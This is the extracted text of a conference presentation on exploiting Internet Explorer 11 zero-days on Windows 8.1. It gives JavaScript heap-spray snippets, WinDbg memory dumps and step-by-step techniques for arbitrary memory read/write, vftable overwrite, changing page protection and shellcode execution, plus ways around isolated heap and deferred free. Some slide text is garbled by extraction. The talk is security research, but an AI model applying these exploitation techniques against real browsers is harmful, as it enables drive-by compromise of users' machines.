IE 11 0day & Windows 8.1 Exploit
-- exp-sky

who am i
· Nsfocus security labs · The security of browser · Vulnerability discovery · Exploit technique · APT attacks detection

What I do

CHALLENGE
Challenge

IE 11 0day&Windows 8.1 Exploit
· 1IntArray Exploit · 2Exec Code · 3IE 11 0day 1 · 4Write NULL Exploit · 5IE 11 0day 2 · 6Object Array Exploit · 7Isolated Heap & Deferred Free · 8Q&A

Intarray exploit
· IntArray heap spray:
Var array_1 = new Array(); for(var i=0; i<size; i++) {
array_1[i] = new Array(0x0c0c0c0c,0x0c0c0c0c, 0x0c0c0c0c,0x0c0c0c0c,0x0c0c0c0c,0x0c0c0c0c, 0x0c0c0c0c,0x0c0c0c0c,0x0c0c0c0c,0x0c0c0c0c, 0x0c0c0c0c,0x0c0c0c0c,0x0c0c0c0c,0x0c0c0c0c, 0x0c0c0c0c,0x0c0c0c0c); }

Intarray exploit

· IntArray info: (IE 10 ­ IE 11)

Struct Array_Head {
void * p_vftable; DOWRD var_2; DOWRD var_3; DOWRD var_4; DOWRD size; DOWRD p_first_buffer; DOWRD p_last_buffer; DOWRD var_8; DOWRD var_9; DOWRD var_10; }

//item size //buffer address //buffer address

Intarray exploit
· IntArray head:
VFTable
0:017> dd 0a0a0000 0a0a0000 62264534 04de5940 00000000 00000005 0a0a0010 00000010 0a0a0028 0a0a0028 00000000 0a0a0020 00000001 03960930 00000000 00000010 0a0a0030 00000010 00000000 0c0c0c0c 0c0c0c0c 0a0a0S0i4ze0 0c0c0c0c 0c0c0c0c 0c0c0cP0c_B0ucff0ecr0c0c 0a0a0050 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 0a0a0060 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 0a0a0070 0c0c0c0c 0c0c0c0c 00000000 00000000

Intarray exploit

· IntArray info: (IE 10 ­ IE 11)

Struct ArrayBuffer {
DWORD var_11; DWORD size; DWORD buffer_size; DWORD next_buffer; DWORD data[buffer_size]; }

//item size //buffer size //next buffer //data

Intarray exploit

· IntArray data buffer: (IE 10 ­ IE 11)

0:017> dd 0a0a0000

Size

0a0a0000 62264534 04de5940 00000000 00000005

0a0a0010 00000010 0a0a0028 0a0a0028 00000000

0a0a0020 00000001 03960930 00000000 00000010

0a0a0030 00000010 00000000 0c0c0c0c 0c0c0c0c

0a0a0040 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c Bu0faf0earS0i0ze50 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c

0a0a0060 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c

0a0a0070 0c0c0c0c 0c0c0c0c 00000000 00000000

Intarray exploit

· IntArray data buffer: (IE 10 ­ IE 11)

array_1[i].push(0x0c0c0c0c);

0:017> dd 0a0a0000

New p_Buffer

0a0a0000 62264534 04de5940 00000000 00000005

0a0a0010 00000011 16b88900 16b88900 00000000

0a0a0020 00000001 03960930 00000000 00000010

0a0a0030 00000010 00000000 0c0c0c0c 0c0c0c0c

Free

0a0a0040 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c

0a0a0050 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c

0a0a0060 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c

0a0a0070 0c0c0c0c 0c0c0c0c 00000000 00000000

Intarray exploit

· IntArray data buffer: (IE 10 ­ IE 11)

Size

BufferSize

0:017> dd 16b88900

16b88900 00000000 00000011 00000020 00000000

16b88910 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c

16b88920 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c

16b88930 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c

16b88940 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c

16b88950 0c0c0c0c 80000002 80000002 80000002

16b88960 80000002 80000002 80000002 80000002

16b88970 80000002 80000002 80000002 80000002

16b88980 80000002 80000002 80000002 80000002

Intarray exploit

· Exploit : edit BufferSize

0x0a0a0000

IntArray IntArray IntArray IntArray IntArray IntArray IntArray

Edit 0x0a0a0000 ArrayBuffer.BufferSize

IntArray IntArray IntArray IntArray IntArray IntArray IntArray

Intarray exploit

· IntArray data buffer: (IE 10 ­ IE 11)
0:015> ed 0c0c0030 7fffffff //Memory Write

0:017> dd 0a0a0000

0a0a0000 62264534 04de5940 00000000 00000005

0a0a0010 00000010 0a0a0028 0a0a0028 00000000

0a0a0020 00000001 03960930 00000000 00000010

0a0a0030 7fffffff 00000000 0c0c0c0c 0c0c0c0c

Bu00faaf00eaarS00i00ze4500

0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c

0a0a0060 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c

0a0a0070 0c0c0c0c 0c0c0c0c 00000000 00000000

Intarray exploit

· Exploit : edit BufferSize

Edit 0x0a0a0000 ArrayBuffer.BufferSize
All Process Memory Read/Write

IntArray IntArray IntArray IntArray IntArray IntArray IntArray

Edit Next IntArray 0x0a0a0080 IntArray.Size ArrayBuffer.Size ArrayBuffer.BufferSize

Intarray exploit
· IntArray data buffer: (IE 10 ­ IE 11)
array_1[i][22] = 0x7fffffff; array_1[i][29] = 0x7fffffff; array_1[i][30] = 0x7fffffff;
0:015> dd 0a0a0080 0a0a0080 64314534 04b05940 00000000 00000005 0a0a0090 7fffffff 0a0a00a8 30a5ca00 00000000 0a0a00a0 00000001 03880760 00000000 7fffffff 0a0a00b0 7fffffff 30a5ca00 0c0c0c0c 0c0c0c0c 0a0a00c0 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 0a0a00d0 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 0a0a00e0 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 0a0a00f0 0c0c0c0c 0c0c0c0c 00000000 00000000

Intarray exploit · Exploit : process memory read/write
var jscript9_base_addr = array_1[i+1][18] - 0x00004534;

Intarray exploit
· But...
array[0] = 0x80000000;
0:015> dd 0c0c0100 0c0c0100 62a94534 04a95940 00000000 00000005 0c0c0110 0000001f 0c0c0128 12612190 00000000 0c0c0120 00000001 037d0900 00000000 00000010 0c0c0130 00000010 12612190 0c0c0c0c 0c0c0c0c 0c0c0140 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0150 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0160 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0170 0c0c0c0c 0c0c0c0c 00000000 00000000

Intarray exploit
· But : array[0] = 0x80000000
array[0] = 0x80000000;
0:016> dd 0c0c0100 0c0c0100 62a94cfc 04ac5980 00000000 00000005 0c0c0110 0000001f 0c0c0128 0c0c0128 00000000 0c0c0120 00000001 00000000 00000000 00000010 0c0c0130 00000010 12708cd0 036f8ed0 18181819 0c0c0140 18181819 18181819 18181819 18181819 0c0c0150 18181819 18181819 18181819 18181819 0c0c0160 18181819 18181819 18181819 18181819 0c0c0170 18181819 18181819 00000000 00000000
0:016> u poi(036f8ed0) jscript9!Js::JavascriptNumber::`vftable':

Intarray exploit

· Data or object ? : (data << 1) | 1

0:016> dd 0c0c0100

0c0c0100 62a94cfc 04ac5980 00000000 00000005

0c0c0110 0000001f 0c0c0128 0c0c0128 00000000

0c0c0120 00000001 00000000 00000000 00000010

0c0c0130 00000010 12708cd0 036f8ed0 18181819

0c0c0140 18181819 18181819 18181819 18181819

0:016D>atua poi(036f8ed0)

Object

jscript9!Js::JavascriptNumber::`vftable':

0:016> ?18181819>>1 Evaluate expression: 202116108 = 0c0c0c0c

IE 11 0day&Windows 8.1 Exploit
· 1IntArray Exploit · 2Exec Code · 3IE 11 0day 1 · 4Write NULL Exploit · 5IE 11 0day 2 · 6Object Array Exploit · 7Isolated Heap & Deferred Free · 8Q&A

Exec code
Save shell code Find shell code Edit process protect Exec shell code

· Sehll Code :

Exec code

· IntArray Value < 0x80000000

Exec code

· Data or object ? : (data << 1) | 1

0:016> dd 0c0c0100

0c0c0100 62a94cfc 04ac5980 00000000 00000005

0c0c0110 0000001f 0c0c0128 0c0c0128 00000000

0c0c0120 00000001 00000000 00000000 00000010

0c0c0130 00000010 12708cd0 036f8ed0 18181819

0c0c0140 18181819 18181819 18181819 18181819

0:016D>atua poi(036f8ed0)

Object

jscript9!Js::JavascriptNumber::`vftable':

0:016> ?18181819>>1 Evaluate expression: 202116108 = 0c0c0c0c

Exec code
· Shell Code :
· 1Encode Sehll Cdoe · DWORD < 0x80000000
· 2Save Shell Code to other object · Find Shell Code

Exec code
· Shell Code :
var shell_code = "\u9090\u9090"; array_1[i+3][0] = shell_code;
0:020> dd 0c0c0180 61db4cfc 04a35980 00000000 00000005 0c0c0190 0000001f 0c0c01a8 0c0c01a8 00000000 0c0c01a0 00000001 00000000 00000000 00000010 0c0c01b0 00000010 1296cdc0 03201240 18181819 0c0c01c0 18181819 18181819 18181819 18181819
0:020> u poi(03201240 ) jscript9!Js::LiteralString::`vftable':

Exec code

· Shell Code :

Struct Js::LiteralString {
VOID* VFTable; DWORD* Arg1; DWORD* Length; VOID* DataBuffer; }

0:020> dd 03201240 L4 03201240 61db6374 04a35140 00000200 03060970
Shell Code

0:015> db 03060970 L8 03060970 90 90 90 90 00 00 00 00

........

Exec code
· Shell Code : Get LiteralString->DataBuffer
Struct Js::LiteralString {
VOID* VFTable; DWORD* Arg1; DWORD* Length; VOID* DataBuffer; }
var string_addr = read_dword(0x0c0c01b8); var shellcode_addr= read_dword(string_addr+0x0c);

Exec code

· Shell Code : Get LiteralString->DataBuffer

shell code address : 0x04e86a00

0:003> db 04e86a00 L4 04e86a00 90 90 90 90

....

0:003> u 04e86a00

04e86a00 90

nop

04e86a01 90

nop

04e86a02 90

nop

04e86a03 90

nop

Exec code
Save shell code Find shell code Edit process protect Exec shell code

Exec code
· VirtualProtect :
Int CustomHeap::Heap::EnsurePageReadWrite(DWORD flOldProtect) {
if ( *(_BYTE *)(flOldProtect + 1) || *(_BYTE *)flOldProtect )
result = 0; else {
VirtualProtect(*(LPVOID *)(flOldProtect + 0xC), 0x1000u, 0x40u, &flOldProtect);
result = flOldProtect; 0:016> dd 0x0c0*c(0_0B3YcTE *)(flOldProtect + 1) = 1; 0c0c003c} 0c0c0000 0c0c0c0c 0c0c0c0c 0c0c0000
return result; }

Exec code
· Virtual function:
Script : 0x0c0c0c0c in array; Int Js::JavascriptNativeIntArray::HasItem(unsigned int arg0) {
unsigned int v2; // [sp+0h] [bp-4h]@1 unsigned int v3; // [sp+Ch] [bp+8h]@0
v2 = arg0; } returnVFJTsa:b:leJavascriptArrOayff:s:eDtirectGetItemAt_int_(v3, &v2); 0:020> u poi(61db4534 +(7c)) jscript9!Js::JavascriptNativeIntArray::HasItem:

Exec code
· Exploit : edit vftable
Script : array_1[i][0] = 0x61ef3ba1; //EnsurePageReadWrite array_1[i+1][18] = 0x0c0bffbc; //Fake VFTable
0:017> dd 0a0a0030 0a0a0030 00000010 00000000 61ef3ba1 0c0c0c0c
Fake 0:V0F2T0a>blded 0c0c0100 0c0c0100 0c0bffbc 04a35940 00000000 00000005 0c0c0110 0000001f 0c0c0128 1296ce10 00000000 0c0c0120 00000001 03060900 00000000 00000010
0:020> dd 0c0bffbc+7c L1 0c0c0038 61ef3ba1 //EnsurePageReadWrite

Exec code

· Exploit : edit vftable
Array i VFTable 0 : 0x61ef3ba1 1 : ... ...
Array i+1(w) VFTable
0 : ... ... 1 : ... ...

EnsurePageReadWrite
Array i+2 VFTable (edit) 0 : ... ... 1 : ... ...

Exec code
· Exploit : edit memory protect
Memory Address Struct
Script : 0x0c0c003c in array; Js::JavascriptNativeIntArray::HasItem CustomHeap::Heap::EnsurePageReadWrite

Exec code

· Exploit : edit memory protect

0:015> !address 0x04f46a00

Usage:

<unknown>

aBarsreayA_d1d[rie]s[s0:] = jscript094_fb4a6s0e0_0addr + 0x00143BA1;

aEnrdraAyd_d1r[eis]s[:1] = 0x0c0c00040f04;8000

aRergriaoyn_1S[iiz]e[:4] = shellco0d0e0_0a2d0d0r0-2; //memory address

aStrartaey:_1[i][18] = 0x0c0bf0f0b0c0;1000 /M/EMe_dCiOtMvMfItTable address

0Pxr0oct0ecc0t0:3c in (array_1[i0+0020]0)0;40 PAGE_EXECUTE_READWRITE

Type:

00020000 MEM_PRIVATE

Allocation Base:

04f30000

Allocation Protect: 00000004 PAGE_READWRITE

Exec code
Save shell code Find shell code Edit process protect Exec shell code

Exec code · Exec Sehll Code
array_1[i][0] = shellcode_addr; 0x0c0c003c in (array_1[i + 2]);

Exec code

Success?

Success?

IE 11 0day&Windows 8.1 Exploit
· 1IntArray Exploit · 2Exec Code · 3IE 11 0day 1 · 4Write NULL Exploit · 5IE 11 0day 2 · 6Object Array Exploit · 7Isolated Heap & Deferred Free · 8Q&A

IE 11 0day 1

· Use after free:

UAF Object : CTreePos Object Size : 0x60

(974.1008): Access violation - code c0000005 (first chance)

First chance exceptions are reported before any exception handling.

This exception may be expected and handled.

eax=068abfc4 ebx=00000008 ecx=03e62fc4 edx=00000000 esi=23c26fc0

edi=046486a8

eip=62e84f17 esp=046485a4 ebp=046485e8 iopl=0

nv up ei pl nz na

cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000

MSHTML!Edit11::CMarkupPositionEnumerator::Analyze+0x32a:

62e84f17 f60104

test byte ptr [ecx],4

ds:0023:03e62fc4=??

IE 11 0day 1

· Memory write:

Memory Write : esi = p_CTreePos ecx = [p_CTreePos+0x24] = p_CTreeNode eax = [p_CTreeNode+0xfc]

//UAF Object

IE 11 0day 1 · Memory write:
Write p_CTreePos address Exploit

IE 11 0day 1 · Memory write: But ...
Write p_CTreePos address Release and set null Exploit

IE 11 0day 1 · Memory write: NULL ...

IE 11 0day&Windows 8.1 Exploit
· 1IntArray Exploit · 2Exec Code · 3IE 11 0day 1 · 4Write NULL Exploit · 5IE 11 0day 2 · 6Object Array Exploit · 7Isolated Heap & Deferred Free · 8Q&A

Write NULL exploit
· Edit IntArray buffer size, but :
0:017> dd 0a0a0000 0a0a0000 62264534 04de5940 00000000 00000005 0a0a0010 00000010 0a0a0028 0a0a0028 00000000 0a0a0020 00000001 03960930 00000000 00000010 0a0a0030 00000000 00000000 0c0c0c0c 0c0c0c0c 0a0a0040 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 0a0a0050 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 0a0a0060 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c 0a0a0070 0c0c0c0c 0c0c0c0c 00000000 00000000

Write NULL exploit

· Edit IntArray buffer size, but :

0:017> dd 0a0a0000

Fake item size

Data Buffer Head

0a0a0000 62264534 0044ddee5594400 00000000 00000005

0a0a0010 0000000000001100 0a0a00aa00000208 0a0a0028 00000000

0a0a0020 00000001 03960930 00000000 00000010

0a0a0030 00000010 00000000 0c0c0c0c 0c0c0c0c

0:017> db 0a0a0000 0a0a0000 34 45 fe 67 40 f9 bb 04-00 00 00 00 05 00 00 00 0a0a0010 10 00 00 00 28 00 0a 0a-28 00 0a 0a 00 00 00 00 0a0a0020 01 00 00 00 f0 08 73 03-00 00 00 00 10 00 00 00 0a0a0030 10 00 00 00 00 00 00 00-0c 0c 0c 0c 0c 0c 0c 0c

Write NULL exploit

· Exploit :
Edit 0x0a0a0000 ArrayBuffer.p_BufferStart
All process memory read/write

IntArray IntArray IntArray IntArray IntArray IntArray IntArray

Edit next IntArray 0x0a0a0080 IntArray.Size ArrayBuffer.Size ArrayBuffer.BufferSize

· Exploit :

Write NULL exploit

Demo

Write NULL exploit

IE 11 0day&Windows 8.1 Exploit
· 1IntArray Exploit · 2Exec Code · 3IE 11 0day 1 · 4Write NULL Exploit · 5IE 11 0day 2 · 6Object Array Exploit · 7Isolated Heap & Deferred Free · 8Q&A

IE 11 0day 2
· Info :
(1544.b44): Access violation - code c0000005 (!!! second chance !!!) eax=e2edccb8 ebx=71050fc0 ecx=00000018 edx=0ee2edcc esi=712fd698 edi=7247bf98 eip=62af42b6 esp=7090ac10 ebp=7090ad48 iopl=0 cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 62af42b6 f6472902 test byte ptr [edi+29h],2 ds:0023:7247bfc1=??
>!heap -p -a 7247bfc1 6ceb8fc2 verifier!AVrfDebugPageHeapFree+0x000000c2 771a0609 ntdll!RtlDebugFreeHeap+0x00000032 7716258c ntdll!RtlpFreeHeap+0x00069afc 770f8755 ntdll!RtlFreeHeap+0x00000425

IE 11 0day 2
· Memory Write:
esi = UAF_Object->pointer add dword ptr [esi+0Ch], 8
· IntArray Exploit.

IE 11 0day 2 · Exploit :Demo
Demo

Write NULL exploit · Exploit :Demo

Success?

Success?

IE 11 0day&Windows 8.1 Exploit
· 1IntArray Exploit · 2Exec Code · 3IE 11 0day 1 · 4Write NULL Exploit · 5IE 11 0day 2 · 6Object Array Exploit · 7Isolated Heap & Deferred Free · 8Q&A

Object Array Exploit
· Object Array(IE 9-IE 11)
0:017> dd 0c0c0000 0c0c0000 611b4cfc 07b943e0 00000000 00000005 0c0c0010 00000014 0c0c0020 0c0c0020 00000000 0c0c0020 00000000 00000014 00000014 00000000 0c0c0030 18181819 18181819 18181819 18181819 0c0c0040 18181819 18181819 18181819 18181819 0c0c0050 18181819 18181819 18181819 18181819
0:017> u 679b4cfc jscript9!Js::JavascriptArray::`vftable':

Object Array Exploit
· Object Array(IE 9-IE 11)
Write : array_1[i] = 0x0c0c0c0c;
0:017> ? 0x0c0c0c0c << 1 | 1 Evaluate expression: 404232217 = 18181819
0:017> dd 0c0c0000 0c0c0000 611b4cfc 07b943e0 00000000 00000005 0c0c0010 00000014 0c0c0020 0c0c0020 00000000 0c0c0020 00000000 00000014 00000014 00000000 0c0c0030 18181819 18181819 18181819 18181819 0c0c0040 18181819 18181819 18181819 18181819 0c0c0050 18181819 18181819 18181819 18181819

Object Array Exploit
· Object Array(IE 9-IE 11)
Read : array_1[i];
Object : if(value & 1 == 0) return value->vfunction_value()
Data : if(value & 1 == 1) return value >> 1

Object Array Exploit
· Object Array(IE 9-IE 11)
0:017> dd Array_1 0c0c0100 679b4cfc 03ae43e0 00000000 00000005 0c0c0110 7fffffff 0c0c0120 0c0c0120 00000000 0c0c0120 00000000 7fffffff 7fffffff 00000000 0c0c0130 18181819 18181819 18181819 18181819
0:017> dd Array_2 0c0c0200 679b4cfc 03ae43e0 00000000 00000005 0c0c0210 7f7f7f7f 0c0c021f 0c0c0220 00000000 0c0c0220 00000000 7f7f7f7f 7f7f7f7f 00000000 0c0c0230 18181819 18181819 18181819 18181819

Object Array Exploit

· All Process Read :

Array_1 : 

Array_2 :  1 byte

Read VFTable 0x0c0c0000 : 0x679b4cfc%4=0
0:017> db 0c0c0000-4 0c0bfffc 01 00 00 00 fc 4c 9b 67-e0 43 ae 03 00 00 00 00

Object Array Exploit

· Array_1 Write DWORD : 0x01010101

Array_1 : 

Array_2 :  1 byte

Read VFTable 0x0c0c0000 : 0x679b4cfc
0:017> db 0c0c0000-4 0c0bfffc 01 01 01 01 fc 4c 9b 67-e0 43 ae 03 00 00 00 00

Object Array Exploit

· Array_2 Read DWORD : 0x009b4cfc

Array_1 : 

Array_2 :  1 byte

Read VFTable 0x0c0c0000 : 0x679b4cfc
0:017> db 0c0c0000-4 0c0bfffc 01 01 01 01 fc 4c 9b 67-e0 43 ae 03 00 00 00 00

Object Array Exploit

· Array_2 Write DWORD : 0x01010101

Array_1 : 

Array_2 :  1 byte

Read VFTable 0x0c0c0000 : 0x679b4cfc
0:017> db 0c0c0000-4 0c0bfffc 01 01 01 01 01 01 01 67-e0 43 ae 03 00 00 00 00

Object Array Exploit

· Array_1 Read DWORD : 0x67000000

Array_1 : 

Array_2 :  1 byte

Read VFTable 0x0c0c0000 : 0x679b4cfc
0:017> db 0c0c0000-4 0c0bfffc 01 01 01 01 01 01 01 67-e0 43 ae 03 00 00 00 00

Object Array Exploit

· Read VFTable : 0x67000000 + 0x009b4cfc

Array_1 : 

Array_2 :  1 byte

Read VFTable 0x0c0c0000 : 0x679b4cfc
0:017> db 0c0c0000-4 0c0bfffc 01 01 01 01 01 01 01 67-e0 43 ae 03 00 00 00 00

Object Array Exploit

· All Process Write :

Array_1 : 

Array_2 :  1 byte

Read VFTable 0x0c0c0000 : 0x679b4cfc
0:017> db 0c0c0000-4 0c0bfffc 01 01 01 01 01 01 01 67-e0 43 ae 03 00 00 00 00

Object Array Exploit

· Array_1 Write VFTable : 0x67000000

Array_1 : 

Array_2 :  1 byte

Write VFTable 0x0c0c0000 : 0x679b4cfc
0:017> db 0c0c0000-4 0c0bfffc 01 01 01 01 01 00 00 67-e0 43 ae 03 00 00 00 00

Object Array Exploit

· Array_2 Write VFTable : 0x9b4cfc00

Array_1 : 

Array_1 :  1 byte

Write VFTable 0x0c0c0000 : 0x679b4cfc
0:017> db 0c0c0000-4 0c0bfffc 01 01 01 01 fc 4c 9b 67-e0 43 ae 03 00 00 00 00

Object Array Exploit

· Read Address ­ 4 byte :

Array_1 : 

Array_2 :  1 byte

Write VFTable 0x0c0c0000 : 0x679b4cfc
0:017> db 0c0c0000-4 0c0bfffc 01 01 01 01 fc 4c 9b 67-e0 43 ae 03 00 00 00 00

Object Array Exploit

· Exploit : Edit BufferSize

Edit 0x0c0c0000 ArrayBuffer.BufferSize
ObjArray_1 + ObjArray_2 All Process Memory Read/Write

ObjArray ObjArray ObjArray ObjArray ObjArray_1 ObjArray_2 ObjArray

Edit ObjArray_1 0x0c0c0100 All Size Edit ObjArray_2 0x0c0c0200 All Size Edit ObjArray_2 p_Buffer_start-1

Object Array Exploit · Exploit CVE-2014-1776 : Demo
Demo

Object Array Exploit · Exploit CVE-2014-1776 : Demo

Success?

But ...

IE 11 0day&Windows 8.1 Exploit
· 1IntArray Exploit · 2Exec Code · 3IE 11 0day 1 · 4Write NULL Exploit · 5IE 11 0day 2 · 6Object Array Exploit · 7Isolated Heap & Deferred Free · 8Q&A

Isolated Heap & Deferred Free · Create Isolated Heap :

Isolated Heap UAF Object

Process Heap Outer Object & Data

Isolated Heap & Deferred Free
· DOM Element Object:
Var b = document.createElement("button"); CButton::CreateElement
|- _MemIsolatedAllocClear() |- HeapAlloc(_g_hIsolatedHeap,8,size)

Isolated Heap & Deferred Free
· Area element coords attribute :
Var a = document.createElement("area"); a.coords = "202116108, 202116108,...";
0:005> dd 03971ab8 03971ab8 00000084 0c0c0c0c 0c0c0c0c 0c0c0c0c 03971ac8 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c
CAreaElement::put_ie8_coords |-CHyperlink::SetAAandcoordsHelper |-CHyperlink::SetcoordsHelper |-CHyperlink::ParseCoords |-HeapAlloc(_g_hProcessHeap,0,size)

Isolated Heap & Deferred Free · Create Isolated Heap :

Isolated Heap UAF Object

Process Heap Outer Object & Data

Isolated Heap & Deferred Free
· Element attribute String:
Var b = document.createElement("button"); a.title = "\u1111\u1111..."; 0:005> dd 0358a620 0358a620 11111111 11111111 11111111 11111111 0358a630 11111111 11111111 11111111 11111111

Isolated Heap & Deferred Free · Create Isolated Heap :

Isolated Heap UAF Object

Process Heap Outer Object & Data

Isolated Heap & Deferred Free · Bypass : Isolated heap vulnerabilities 0day

Isolated Heap & Deferred Free · Bypass : Process heap vulnerabilities 0day

Success?

Isolated Heap & Deferred Free · July Deferred Free :

Isolated Heap & Deferred Free
· Bypass Deferred Free: · Release Element Size > 100000
function release() {
CollectGarbage(); release_array = new Array(); for(var i=0;i<280;i++)
release_array[i] = document.createElement("object"); for(var i=0;i<280;i++)
release_array[i] = null; CollectGarbage(); }

IE 11 0day&Windows 8.1 Exploit
· Summary
· 1IntArray exploit · 2Exec Code · 3Write NULL exploit · 4Object array exploit · 5Isolated heap & Deferred free

IE 11 0day&Windows 8.1 Exploit

· 

· @tombkeeper @

· @dm557

@120

· @ga1ois

@

· @ClaudXiao

@-Keen

· @binjo_

@bluerust

· @demi6od

@eLeMan

· @Backend

@coolq1981

· 

IE 11 0day&Windows 8.1 Exploit
· 1IntArray Exploit · 2Exec Code · 3IE 11 0day 1 · 4Write NULL Exploit · 5IE 11 0day 2 · 6Object Array Exploit · 7Isolated Heap & Deferred Free · 8Q&A

IE 11 0day&Windows 8.1 Exploit
Q&A

IE 11 0day&Windows 8.1 Exploit

· Thanks!

· Twitter&WeiBo : @exp-sky

· Blog

: http://exp-sky.org/

· Email

: exploitsky@gmail.com

